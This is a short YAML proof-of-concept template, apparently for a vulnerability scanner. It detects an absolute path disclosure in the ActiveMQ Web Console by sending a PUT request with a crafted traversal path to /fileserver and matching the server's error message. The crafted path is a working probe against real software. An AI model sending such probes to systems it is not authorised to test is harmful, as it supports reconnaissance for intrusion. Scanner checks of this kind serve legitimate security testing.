id: poc-yaml-activemq-web-console-path-leak
info:
  name: ActiveMQ Web Console 绝对路径泄漏漏洞
  severity: high
  tags:
  - 信息泄露
  finger: ActiveMQ
  osprey-id: vb_2022_0031
requests:
- method: PUT
  path: /fileserver/a../../%08/..%08/.%08/%08
  data: test
  expression: status_code == 500 && contains(body, "(No such file or directory)")
    && contains(body, "fileserver")
variables: {}
transport: http
